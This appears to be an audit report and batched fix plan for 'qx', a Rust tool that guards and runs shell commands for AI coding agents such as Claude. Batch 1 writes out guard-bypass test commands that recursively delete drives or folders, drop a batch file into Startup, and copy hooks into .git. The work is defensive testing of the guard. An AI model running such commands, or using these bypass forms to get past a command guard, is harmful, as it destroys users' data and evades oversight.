   - Fix: (a) A Drop guard that clears `BUILDING` and calls `notify_all`. (b) Check `inflight.cancelled()` before the `fs` branch and pass a cloned `Arc<AtomicBool>` into the walks. (c) Reply "already finished; output went to another poll" when `find_job` is None. (d) On write, delete `.qx-tmp-*` older than 1 hour in the target's parent folder. (e) Delete a spool file only if it is outside the newest 40 AND older than 10 minutes. (f) Move the sweep into `install`, after the bytes differ and the copy worked, and remove `.new` on failure. (g) `File::create`, `write_all`, `sync_all`, `rename`; write the backup only if none exists. (h) In `norm_header`, turn `'` into `"`. (i) Add `claude_config_dir` to `Paths`. (j) Strip `\\?\` before the slash flip. (o) `timeout-minutes: 30` on both jobs, and `cargo check --locked --all-targets` for MSRV. For (l), add one temp-dir `apply` test and one deterministic fuzz test of `rewrite_bash` (its invariant must allow the `timeout` rewrite).
   - If we skip it: Each is rare and low cost, except (b), (d) and (g), which show up as stray files or wasted work.

**Left out (6 tiny built-in and CLI items):**
- `builtin-ps-twin-edges` (`Write-Output` with no args, `Test-Path ""`).
- `builtin-mkdir-cmd-semantics`.
- `builtin-basename-dirname-root`.
- `builtin-which-ignores-env-prefix`.
- `builtin-dir-open-errors`.
- `mcp-16` (`parse_num` takes bad CLI numbers silently).

Fix them only when you touch those lines.

## Plan

Do the work after this read-only audit. Batches run in this order. Batches that touch disjoint files are marked and can run in parallel.

**Batch 0: green CI**
- Goal: Make clippy pass and pin the toolchain.
- Closes: 32.
- Files: src/exec.rs, src/fsops.rs, .github/workflows/ci.yml.
- Proof: `cargo clippy --release --all-targets --locked -- -D warnings` exits 0.
- Size: S.
- Depends on: nothing. Do it before Batches 2 and 4, because it touches their files.

**Batch 1: guard safety**
- Goal: Close the bypasses and the false block.
- Closes: 1, 2, 5, 6, 7, 8, 9, and the launcher part of 38.
- Files: src/guard.rs only.
- Proof: One new test per case in the guard tests: `%ComSpec% /c rd /s /q C:\`, `& $env:ComSpec ...`, `rm -rf $(pwd)`, `rd/s/q C:\Windows`, `cmd /c"rd /s /q C:\"`, `X=C:/Windows rm -rf $X`, `echo rd /s /q C:\Windows | cmd`, the bare `UploadFile` line, `curl -o ...\Startup\a.bat`, `copy x C:\PROGRA~1\new.exe`, `cp pre-commit .git/hooks`, and the allowed `python -c "import shutil..."`. Then `cargo test guard`, plus `cargo test fuzz`.
- Size: M.
- Depends on: nothing. Independent of Batches 3, 7 and 9.

**Batch 2: exec correctness**
- Goal: Stop silent partial runs and bad argument quoting.
- Closes: 3, 19, and the `rustup` item (j) in 40.
- Files: src/exec.rs, src/resolve.rs.
- Proof: Test a two-line `echo` command, expecting both lines or an error. Test `program:"bash" args:["-c","printf '[%s]' \"$0\"","f*.txt"]` against the literal. Test a `\\?\C:\x` override key.
- Size: S.
- Depends on: Batch 0.

**Batch 3: built-in correctness and speed**
- Goal: Fix wrong answers and wasted fallbacks.
- Closes: 4, 22, 23, 24, 25, 26, 27, and the grep copy in 37.
- Files: src/builtin.rs.
- Proof: Tests for `Test-Path env:PATH` (expect None or True), a mid-walk cancel for grep, `grep -rn foo src -i`, a tree with one binary file, `cp` of an older file then a check of the mtime, `ls src/main.rs`, a UTF-16 head test, `seq 0.1 0.1 0.3` (three lines), and `realpath` of a new file. Then `cargo test builtin`.
- Size: M.
- Depends on: nothing. Independent of Batches 1, 7 and 9.

**Batch 4: `fs` correctness and memory**
- Goal: Remove wrong results and RAM spikes in `fs`.
- Closes: 10, 11, 12, 13, 14, 15, the `fs` items in 37 and 39, and (d), (g) in 40.
- Files: src/fsops.rs, src/warmup.rs.
- Proof: Tests: write with no cwd returns an error; grep `^$` on an empty file and a file ending in `\n` reports no phantom line; a 20 MB one-line file greps with bounded RAM (watch peak working set); a minified-line hit shows the match; `glob ./src/**/*.rs` equals `src/**/*.rs`. Compare `fs grep` speed before and after the `Matcher::Lit` removal on the same tree.
- Size: L.
- Depends on: Batch 0.

**Batch 5: MCP server and tests**
- Goal: Make jobs and spawn failures safe, and the tests stable.
- Closes: 16, 17, 33, and (a), (b), (c) in 40 plus (h), (g) in 39.
- Files: src/mcp.rs, src/index.rs, src/main.rs.
- Proof: A job test with a small soft window: poll, cancel the poll, then poll again, and the child must still run. Cap test: the 7th job is rejected. Run `cargo test` 5 times in a row with no red.
- Size: M.
- Depends on: nothing for mcp.rs. If Batch 6 edits index.rs, run them one after the other.

**Batch 6: index and warm-process RAM**
- Goal: Stop the eviction of the workspace index and cut idle RAM.
- Closes: 18, 34, and (f), (e) in 39.
- Files: src/index.rs, src/exec.rs, src/warmup.rs.
- Proof: Measure `powershell.exe` working set once. Test: `fs glob` at root after queries from 5 sub-cwds shows the root index still registered. A parked host drops after the idle limit, and the next call is cold but works.
- Size: M.
- Depends on: Batches 2 and 5 (exec.rs, index.rs).

**Batch 7: hook and output pipeline**
- Goal: Keep output when Claude times out, and show full mid-size diffs.
- Closes: 20, 21, 38 (redaction part), and (i), (j), (k) in 39.
- Files: src/hook.rs, src/digest.rs, src/compact.rs, src/redact.rs, src/main.rs.
- Proof: Hook test: an event with `timeout: 60000` yields `--timeout 58`. A 250-line diff shows all 250 lines. A `postgres://app:s3cr#etPass@h/x` line is fully masked. A 200-line flood of 4000-character lines is capped at 64 KB. Add the hook fuzz test.
- Size: M.
- Depends on: nothing. Independent of Batches 1, 3 and 9.

**Batch 8: spool and tmp-file cleanup**
- Goal: Remove stray files and evicted outputs.
- Closes: (d), (e) in 40.
- Files: src/compact.rs, src/fsops.rs.
- Proof: Create 45 spool files in under 10 minutes and confirm none of the newest are deleted. Kill a write mid-replace and confirm the next write removes the old `.qx-tmp-*`.
- Size: S.
- Depends on: Batches 4 and 7 (shared files).

**Batch 9: setup, doctor and deploy**
- Goal: Stop data loss and false "ok" in setup.
- Closes: 28, 29, 30, 31, and (f), (g), (h), (i) in 40.
- Files: src/setup/*, src/deploy.rs, src/doctor.rs, integrations/pi/*.
- Proof: Temp-dir tests that call `apply`: a Codex table with `enabled_tools` and a tools subtable survives; Hermes `tools:` after `env:` survives; BOM and comment-after-key files are edited; a missing exe makes `setup` exit 2; a stale hook path makes `doctor` show drift; the pi upgrade removes `qx.js`. Then `cargo test setup`.
- Size: L.
- Depends on: nothing. Independent of Batches 1, 3 and 7.

**Batch 10: lean and docs**
- Goal: Delete dead code and fix the notes.
- Closes: 36, 37 (remaining), and (o) in 40.
- Files: README.md, Gatcha.md, src/main.rs (help), src/client.rs, src/setup/*, ci.yml.
- Proof: `qx --help` shows default 8. Clippy `-D warnings` passes after dropping the `allow`s. Line count drops.
- Size: S.
- Depends on: Batches 4 and 9 (their files).

**Batch 11: Cursor setup (feature gap)**
- Goal: Add `qx setup cursor` and a working allowlist.
- Closes: 35.
- Files: src/client.rs, src/setup/mod.rs, new src/setup/cursor.rs, README.md, Map.md.
- Proof: Spike first: confirm `Mcp(qx:*)` and the tool names from Cursor docs or a log. Then `qx setup cursor --dry-run` prints the diff, `qx setup cursor` writes `mcp.json` and `cli-config.json`, and a Cursor agent runs `cargo test` through qx without a prompt. Update the tests that iterate `ALL`.
- Size: M.
- Depends on: Batch 9 (setup/mod.rs) and the uncommitted client.rs diff.

## Verdict

The code is generally strong, but two guard bypasses, two silent wrong answers (multi-line cmd, provider paths) and setup rewriting user configs need fixing first.

Lean: -110 lines, no dependency removable (item 39(k) would add `serde`; skip it).

Not checked:
- Nothing was built, run or timed. Every finding comes from reading the code. The one exception is the `cmd.exe` multi-line probe.
- The guard-03, guard-04, guard-14 and guard-15 mechanisms were traced by hand, so write each failing test first.
- RAM figures, such as the PowerShell host size, are estimates.
- Whether rustup writes `\\?\` keys, whether Defender locks the deploy copy, and whether cloud placeholders carry the reparse attribute.
- Cursor's wildcard rule, tool names and client name, and Codex per-tool approval key names, which come from memory of those products' docs.
- The cause of the EOF test flake: a race or the ping failing in the sandbox.
- Files no auditor fully read: much of resolve.rs, npm.rs, python.rs and the digest/compact test modules; `docs/superpowers`; `integrations/pi/bridge.test.mjs` and `smoke.mjs`.
- The uncommitted diffs in src/fsops.rs, src/client.rs, src/redact.rs and Cargo.toml were covered only where the subsystem audits touched them.